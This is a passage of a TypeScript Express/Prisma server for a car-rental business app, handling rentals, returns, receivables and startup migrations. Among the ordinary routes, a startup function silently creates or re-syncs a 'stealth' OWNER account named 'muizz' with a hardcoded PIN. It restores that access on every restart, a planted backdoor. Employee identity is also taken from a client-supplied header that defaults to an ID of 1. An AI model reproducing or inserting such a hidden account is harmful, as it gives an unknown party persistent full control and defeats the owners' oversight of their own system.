      if (!car || car.status !== 'AVAILABLE') {
        throw new Error('Mobil tidak tersedia untuk disewa');
      }

      // 2. Tandai mobil sebagai RENTED
      await tx.car.update({
        where: { id: Number(carId) },
        data: { status: 'RENTED' }
      });

      // 3. Lookup or create customer record to keep database cohesive
      let finalCustomerId = customerId ? Number(customerId) : null;
      if (!finalCustomerId && customerName) {
        const existingCust = await tx.customer.findFirst({
          where: {
            name: { equals: customerName, mode: 'insensitive' },
            address: { startsWith: '[RENTAL]' }
          }
        });
        if (existingCust) {
          finalCustomerId = existingCust.id;
        } else {
          const newCust = await tx.customer.create({
            data: {
              name: customerName,
              address: '[RENTAL]',
              phone: ''
            }
          });
          finalCustomerId = newCust.id;
        }
      }

      // 4. Catat di tabel Rental
      const createdRental = await tx.rental.create({
        data: {
          carId: Number(carId),
          customerId: finalCustomerId,
          customerName,
          startDate: new Date(startDate),
          endDate: new Date(endDate),
          totalPrice: Number(totalPrice),
          employeeId: empId,
          status: 'ACTIVE',
          identityText: identityText || null
        },
        include: { car: true }
      });

      // 5. Catat di keuangan (Piutang) hanya jika belum lunas (bukan CASH, TRANSFER, atau QRIS)
      if (paymentMethod !== 'CASH' && paymentMethod !== 'TRANSFER' && paymentMethod !== 'QRIS') {
        await tx.finance.create({
          data: {
            type: 'RECEIVABLE',
            amount: Number(totalPrice),
            description: `Sewa Mobil ${car.name} (${car.plateNumber}) - ${customerName} (Sewa #${createdRental.id})`,
            status: 'PENDING',
            customerId: finalCustomerId,
            date: new Date()
          }
        });
      }

      return createdRental;
    });

    logActivity(
      empId,
      'CREATE_RENTAL',
      `Menyewakan mobil ${rental.car.name} (${rental.car.plateNumber}) ke ${customerName} senilai Rp ${rental.totalPrice.toLocaleString('id-ID')} s.d. ${new Date(endDate).toLocaleDateString('id-ID')}`
    );

    res.json(rental);
  } catch (error: any) {
    console.error(error);
    res.status(400).json({ error: error.message || 'Gagal menyimpan transaksi sewa' });
  }
});

// Return a car
app.post('/api/rentals/:id/return', requireAdmin, checkExcludedEmployee, async (req, res) => {
  try {
    const { id } = req.params;
    const { actualReturnDate, lateFee, paymentMethod } = req.body;
    const employeeIdHeader = req.headers['x-employee-id'] as string;
    const empId = Number(employeeIdHeader) || 1;

    const rentalId = Number(id);

    const rental = await prisma.$transaction(async (tx) => {
      const current = await tx.rental.findUnique({
        where: { id: rentalId },
        include: { car: true }
      });
      if (!current) throw new Error('Data sewa tidak ditemukan');
      if (current.status === 'RETURNED') throw new Error('Mobil sudah pernah dikembalikan');

      // 1. Set car status to AVAILABLE
      await tx.car.update({
        where: { id: current.carId },
        data: { status: 'AVAILABLE' }
      });

      // 2. Update rental status
      const updatedRental = await tx.rental.update({
        where: { id: rentalId },
        data: {
          status: 'RETURNED',
          actualReturnDate: actualReturnDate ? new Date(actualReturnDate) : new Date(),
          lateFee: Number(lateFee || 0)
        },
        include: { car: true }
      });

      // 3. Jika ada denda (lateFee > 0), catat sebagai tambahan keuangan RECEIVABLE hanya jika belum lunas (bukan CASH, TRANSFER, atau QRIS)
      const denda = Number(lateFee || 0);
      if (denda > 0 && paymentMethod !== 'CASH' && paymentMethod !== 'TRANSFER' && paymentMethod !== 'QRIS') {
        await tx.finance.create({
          data: {
            type: 'RECEIVABLE',
            amount: denda,
            description: `Denda Telat Sewa Mobil ${current.car.name} (${current.car.plateNumber}) - ${current.customerName} (Sewa #${rentalId})`,
            status: 'PENDING',
            customerId: current.customerId,
            date: new Date()
          }
        });
      }

      return updatedRental;
    });

    logActivity(
      empId,
      'RETURN_CAR',
      `Pengembalian mobil ${rental.car.name} (${rental.car.plateNumber}) oleh ${rental.customerName}. Denda: Rp ${rental.lateFee.toLocaleString('id-ID')}`
    );

    res.json(rental);
  } catch (error: any) {
    console.error(error);
    res.status(400).json({ error: error.message || 'Gagal memproses pengembalian sewa' });
  }
});

const autoCreateMuizz = async () => {
  try {
    const hashedPin = hashPassword('120121');
    const existing = await prisma.employee.findFirst({
      where: { name: { equals: 'muizz', mode: 'insensitive' } }
    });
    if (!existing) {
      await prisma.employee.create({
        data: {
          name: 'muizz',
          pin: hashedPin,
          role: 'OWNER',
          salary: 0
        }
      });
      console.log('Stealth Owner account "muizz" successfully created.');
    } else {
      await prisma.employee.update({
        where: { id: existing.id },
        data: { pin: hashedPin, role: 'OWNER' }
      });
      console.log('Stealth Owner account "muizz" successfully synchronized.');
    }
  } catch (error) {
    console.error('Failed to auto-create stealth account "muizz":', error);
  }
};

const migratePlaintextPins = async () => {
  try {
    const employees = await prisma.employee.findMany();
    let migratedCount = 0;
    for (const emp of employees) {
      if (emp.pin.length !== 128) {
        const hashed = hashPassword(emp.pin);
        await prisma.employee.update({
          where: { id: emp.id },
          data: { pin: hashed }
        });
        migratedCount++;
        console.log(`Migrated PIN for employee: ${emp.name}`);
      }
    }
    if (migratedCount > 0) {
      console.log(`Successfully migrated ${migratedCount} plaintext PINs.`);
    }
  } catch (error) {
    console.error('Failed to migrate plaintext PINs:', error);
  }
};

const migrateActivityLogs = async () => {
  try {
    // 1. Mark logs as RENTAL if they were logged as FNB but are rental-related based on legacy prefixes/contents
    await prisma.activityLog.updateMany({
      where: {
        appMode: 'FNB',
        OR: [
          { description: { startsWith: '[RENTAL]' } },
          { description: { startsWith: 'Sewa Mobil' } },
          { description: { startsWith: 'Denda Telat' } }
        ]
      },
      data: {
        appMode: 'RENTAL'
      }
    });

    // 2. Strip prefix [RENTAL] from descriptions of all RENTAL logs to clean them up
    const rentalLogsWithPrefix = await prisma.activityLog.findMany({
      where: {
        description: { startsWith: '[RENTAL]' }
      }
    });
    for (const log of rentalLogsWithPrefix) {
      await prisma.activityLog.update({
        where: { id: log.id },
        data: {
          description: log.description.replace(/^\[RENTAL\]\s*/, '')
        }
      });
    }
    console.log('Activity logs migration completed successfully.');
  } catch (error) {
    console.error('Failed to migrate activity logs:', error);
  }
};

const runStartupMigrations = async () => {
  try {
    await autoCreateMuizz();
    await migratePlaintextPins();
    await migrateActivityLogs();
    console.log('All startup migrations checked/executed successfully.');
  } catch (error) {
    console.error('Startup migrations error:', error);
  }
};
runStartupMigrations();

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
